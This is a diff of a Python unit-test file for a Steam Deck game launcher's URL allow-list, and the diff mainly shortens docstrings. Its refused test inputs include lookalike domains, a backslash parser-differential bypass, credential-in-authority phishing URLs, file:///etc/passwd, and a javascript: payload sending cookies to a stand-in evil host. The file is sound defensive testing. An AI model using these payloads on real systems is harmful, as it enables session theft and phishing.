@@ -1,20 +1,9 @@
 # Shelfcloud project - https://shelfcloud.cc - bart@schelstraete.org
 """Where a Steam shortcut is allowed to send the browser.
 
-A launch opens a kiosk-mode Chromium — no address bar, no tab strip — using a
-profile that holds live Microsoft, NVIDIA and Boosteroid sessions. A page shown
-in that window cannot be inspected by the person looking at it, so "which URL"
-is a security question, not a routing detail.
-
-The URL arrives from two places, and NEITHER is trusted:
-
-  1. the gateway, asked at launch time — a server, and servers get compromised
-  2. the Steam shortcut itself, written by an earlier sync and sat on disk since
-
-So the check lives here, on the device. The gateway agreeing with it is not
-what makes it safe; the device refusing is.
-
-Run: python3 -m pytest tests/unit
+A launch opens a kiosk Chromium with live provider sessions and no address bar,
+so "which URL" is a security question. The URL comes from the gateway or an
+old on-disk shortcut, neither trusted, so the check lives here on the device.
 """
 
 import os
@@ -24,8 +13,7 @@ from unittest import mock
 
 import pytest
 
-# cdp is imported by the launcher for the autoplay click; it pulls in nothing
-# needed here, and stubbing it keeps this a unit test.
+# cdp is only needed for the autoplay click; stub it to keep this a unit test
 sys.modules.setdefault("cdp", types.ModuleType("cdp"))
 
 ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -42,10 +30,7 @@ spec.loader.exec_module(launcher)
 allowed = launcher.is_allowed_launch_url
 
 
-# ------------------------------------------------- the real provider URLs
-#
-# Shapes taken from the production catalog, which is https on exactly three
-# hosts across all 5,965 rows.
+# the real provider URLs, shapes taken from the production catalog
 
 @pytest.mark.parametrize("url", [
     "https://play.geforcenow.com/games?game-id=abc-123&lang=en_US",
@@ -62,11 +47,8 @@ def test_the_providers_are_allowed(url):
     assert allowed(url) is True
 
 
-# ------------------------------------------------------------- Amazon Luna
-#
-# Luna is the one provider pinned to a FULL host rather than a registrable
-# domain, because "amazon.com" as a suffix rule would admit everything Amazon
-# serves. These tests are what keeps that decision from being casually undone.
+# Luna is pinned to a full host, not a registrable domain: "amazon.com" as a
+# suffix rule would admit everything Amazon serves.
 
 @pytest.mark.parametrize("hostile", [
     "https://www.amazon.com/dp/B0GFWDM8NP",        # retail
@@ -78,23 +60,14 @@ def test_the_providers_are_allowed(url):
     "https://luna.amazon.de/game/x",               # real Luna, but not our host
 ])
 def test_only_the_luna_host_is_allowed_not_amazon_at_large(hostile):
-    """Widening this entry to "amazon.com" would pass every one of these.
-
-    The launch opens in a kiosk browser with no address bar, carrying live
-    provider sessions — so "somewhere on amazon.com" is not a safe answer.
-    luna.amazon.de is refused for the same reason and costs nothing: the
-    catalog stores luna.amazon.com links, which redirect each user to their own
-    country's Luna domain anyway.
-    """
+    """Widening this to "amazon.com" would pass every one of these. luna.amazon.de
+    is refused too and costs nothing: the catalog stores .com links that
+    redirect each user to their own country anyway."""
     assert allowed(hostile) is False, hostile
 
 
-# ------------------------------------------------------- our own website tile
-#
-# The plugin makes a "Shelfcloud (website)" tile so the catalogue can be
-# browsed under Steam Input. Its URL goes through the same check as a game's,
-# and the gateway's host was NOT on the list — so the launcher refused its own
-# website with exit 3 and the tile silently did nothing.
+# our own website tile: its URL runs the same check, and the gateway host was
+# once missing from the list, so the launcher refused its own website.
 
 def test_the_website_tile_can_actually_launch():
     assert allowed(launcher.GATEWAY) is True
@@ -102,18 +75,16 @@ def test_the_website_tile_can_actually_launch():
 
 
 def test_the_gateway_entry_is_derived_from_the_gateway_constant():
-    """Typed twice, they drift; the day GATEWAY moves, the website tile breaks
-    again and nothing says why."""
+    """Typed twice they drift, and the website tile breaks when GATEWAY moves."""
     import urllib.parse
     host = urllib.parse.urlsplit(launcher.GATEWAY).hostname
     assert host in launcher.ALLOWED_LAUNCH_DOMAINS
 
 
 def test_the_old_plaintext_lan_gateway_is_still_refused():
-    """Shortcuts synced before the gateway became a constant still carry
-    http://192.168.x.x:8000 in their launch options. Admitting our own host
-    must not admit that: it is http, and on a LAN address that may now belong
-    to somebody else entirely."""
+    """Old shortcuts still carry http://192.168.x.x:8000. Admitting our own
+    host must not admit that: http, on a LAN address that may now be someone
+    else's."""
     assert allowed("http://192.168.129.164:8000") is False
     assert allowed("http://shelfcloud.cc/") is False
 
@@ -126,28 +97,24 @@ def test_a_lookalike_of_our_own_host_is_refused():
 
 
 def test_the_luna_launch_url_the_catalog_actually_builds_is_allowed():
-    """Guards the contract between the two repos.
-
-    The gateway's sources/amazon_luna.py builds exactly this shape. If either
-    side changes host or scheme, every Luna tile stops launching — and the
-    failure appears on the device, not in the gateway's tests.
-    """
+    """Guards the contract with the gateway's amazon_luna.py: if either side
+    changes host or scheme, every Luna tile stops launching."""
     built = "https://luna.amazon.com/game/{slug}/{asin}?autoplay=1".format(
         slug="alien-isolation", asin="B09HFKWMTQ")
     assert allowed(built) is True
 
 
 def test_a_subdomain_of_a_provider_is_allowed():
-    """Providers move things between subdomains; the registrable domain is the
-    thing being trusted, not one hostname."""
+    """Providers move things between subdomains, so the registrable domain is
+    what we trust."""
     assert allowed("https://eu-west.play.geforcenow.com/games?game-id=1") is True
 
 
 # ------------------------------------------------------- what must be refused
 
 def test_plain_http_is_refused():
-    """A launch carries provider session cookies. Over http they are readable
-    by anything on the path, which can also rewrite the page."""
+    """A launch carries session cookies, readable over http by anything on the
+    path."""
     assert allowed("http://play.geforcenow.com/games?game-id=1") is False
 
 
@@ -156,12 +123,8 @@ def test_an_unrelated_site_is_refused():
 
 
 def test_a_suffix_lookalike_is_refused():
-    """The bug this class of check is famous for.
-
-    "xbox.com.evil.com" ends with "xbox.com". Without requiring the dot that
-    starts the label, every allow-list of this shape is bypassed by registering
-    one domain.
-    """
+    """"xbox.com.evil.com" ends with "xbox.com". Without requiring the dot that
+    starts the label, one registered domain bypasses the whole list."""
     for hostile in ("https://xbox.com.evil.com/play",
                     "https://play.geforcenow.com.evil.com/games",
                     "https://notxbox.com/play",
@@ -178,20 +141,9 @@ def test_a_suffix_lookalike_is_refused():
     "https://www.xbox.com\\@evil.com/",
 ])
 def test_a_backslash_is_refused_because_the_browser_reads_it_as_a_slash(hostile):
-    """The check and the browser must agree on what the host is.
-
-    Python's urlsplit follows RFC 3986, where "\\" is an ordinary character, so
-    the host of
-
-        https://evil.com\\cloud.boosteroid.com/steal
-
-    is "evil.com\\cloud.boosteroid.com" — which ends with ".boosteroid.com" and
-    passed every other rule here. Chromium follows the WHATWG URL Standard,
-    where "\\" ends the authority exactly like "/", so the SAME string opens
-    evil.com: an attacker's page, in kiosk mode, with the user's provider
-    sessions and no address bar to reveal it.
-
-    A parser differential, and the browser is the parser that matters.
+    """A parser differential. urlsplit (RFC 3986) reads "\\" as ordinary, so the
+    host ends with ".boosteroid.com" and passes; Chromium (WHATWG) reads "\\"
+    like "/", so the same string opens evil.com. The browser is what matters.
     """
     assert allowed(hostile) is False
 
@@ -203,31 +155,28 @@ def test_a_backslash_is_refused_because_the_browser_reads_it_as_a_slash(hostile)
     "https://www.xbox.com\n",
 ])
 def test_tabs_and_newlines_are_refused(hostile):
-    """Browsers strip these from a URL before resolving it, which can move the
-    host boundary after this function has approved the string."""
+    """Browsers strip these before resolving, which can move the host boundary
+    after this function approved the string."""
     assert allowed(hostile) is False
 
 
 def test_the_raw_string_is_checked_before_it_is_stripped():
-    """A trailing newline is part of the attack, so .strip() must not remove it
-    before the check has had a chance to see it."""
+    """A trailing newline is part of the attack, so .strip() must not eat it
+    before the check sees it."""
     assert allowed("https://evil.com\\www.xbox.com/\n") is False
 
 
 def test_credentials_in_the_authority_are_refused():
-    """"https://play.geforcenow.com@evil.com/" is a URL whose HOST is evil.com.
-
-    It reads as the provider to a person and resolves elsewhere to a browser,
-    which is exactly the property a phishing link wants.
-    """
+    """"https://play.geforcenow.com@evil.com/" has host evil.com: reads as the
+    provider, resolves elsewhere -- a phishing link."""
     for hostile in ("https://play.geforcenow.com@evil.com/",
                     "https://www.xbox.com:pass@evil.com/play"):
         assert allowed(hostile) is False, hostile
 
 
 def test_non_web_schemes_are_refused():
-    """A Chromium command line accepts more than web pages: file:// reads local
-    files, and the rest are things a game launcher has no business opening."""
+    """A Chromium command line accepts more than web pages -- file:// reads
+    local files -- which a game launcher has no business opening."""
     for hostile in ("file:///etc/passwd",
                     "file:///home/deck/homebrew/settings/Shelfcloud/settings.json",
                     "javascript:fetch('//evil/?c='+document.cookie)",
@@ -238,17 +187,15 @@ def test_non_web_schemes_are_refused():
 
 
 def test_junk_is_refused_rather_than_raising():
-    """This runs at launch. An exception here is a game that will not start
-    with a Python traceback Steam throws away."""
+    """Runs at launch, so an exception is a game that will not start."""
     for junk in (None, "", "   ", 42, [], {}, b"https://www.xbox.com/play",
                  "not a url", "https://", "https:///play", "://xbox.com"):
         assert allowed(junk) is False, repr(junk)
 
 
 def test_a_trailing_dot_host_does_not_slip_past():
-    """"www.xbox.com." is the same host to a resolver. It is allowed — but the
-    point is that it is NORMALISED rather than compared raw, because the same
-    trick applied to a lookalike must still fail."""
+    """"www.xbox.com." is the same host to a resolver, so it is normalised, not
+    compared raw -- the same trick on a lookalike must still fail."""
     assert allowed("https://www.xbox.com./play") is True
     assert allowed("https://www.xbox.com.evil.com./play") is False
 
@@ -271,8 +218,8 @@ def settings(tmp_path, **extra):
 
 
 def test_a_hostile_url_from_the_gateway_falls_back_instead_of_opening(tmp_path):
-    """A compromised gateway is the threat this exists for. Its answer is
-    refused and the known-good stored link is used."""
+    """A compromised gateway is the threat: its answer is refused and the
+    stored good link used."""
     good = "https://cloud.boosteroid.com/application/682"
     with mock.patch.object(launcher, "SETTINGS_FILE", settings(tmp_path)), \
          mock.patch.object(launcher, "urllib") as net:
@@ -282,7 +229,7 @@ def test_a_hostile_url_from_the_gateway_falls_back_instead_of_opening(tmp_path):
         response.__exit__ = lambda *a: False
         response.read.return_value = b'{"launch_url": "https://evil.example/phish"}'
         net.request.urlopen.return_value = response
-        # urlsplit is needed by the validator, so keep the real parser.
+        # the validator needs urlsplit, so keep the real parser
         net.parse = __import__("urllib.parse", fromlist=["parse"])
 
         url, source = launcher.resolve_launch("42", good)
@@ -292,10 +239,9 @@ def test_a_hostile_url_from_the_gateway_falls_back_instead_of_opening(tmp_path):
 
 
 def test_the_gateway_address_is_the_constant_not_a_setting(tmp_path):
-    """settings.json still carries a gateway_url from older builds — on this
-    developer's Deck a plaintext http://192.168.x.x:8000. Reading it sent the
-    bearer token across the LAN in clear and took the launch URL from whoever
-    answered that port."""
+    """Old settings.json still carries a plaintext gateway_url. Reading it would
+    send the token over the LAN in clear and take the URL from whoever answered.
+    """
     seen = {}
 
     def capture(url, *a, **kw):
@@ -313,8 +259,7 @@ def test_the_gateway_address_is_the_constant_not_a_setting(tmp_path):
 
 
 def test_the_launcher_and_the_plugin_agree_on_the_gateway():
-    """Two files, one address. They have disagreed before, and the disagreement
-    is what kept the plaintext path alive after the plugin had moved on."""
+    """Two files, one address. A disagreement kept the plaintext path alive."""
     import re
     with open(os.path.join(ROOT, "main.py"), encoding="utf-8") as handle:
         match = re.search(r'^DEFAULT_GATEWAY\s*=\s*"([^"]+)"', handle.read(), re.M)
@@ -323,8 +268,8 @@ def test_the_launcher_and_the_plugin_agree_on_the_gateway():
 
 
 def test_the_gateway_is_reached_over_verified_tls():
-    """The context must verify and check hostnames — that is what makes a
-    machine-in-the-middle fail rather than succeed silently."""
+    """The context must verify and check hostnames, or a man-in-the-middle
+    succeeds silently."""
     import ssl
     ctx = launcher._ssl_context()
     assert ctx.verify_mode == ssl.CERT_REQUIRED
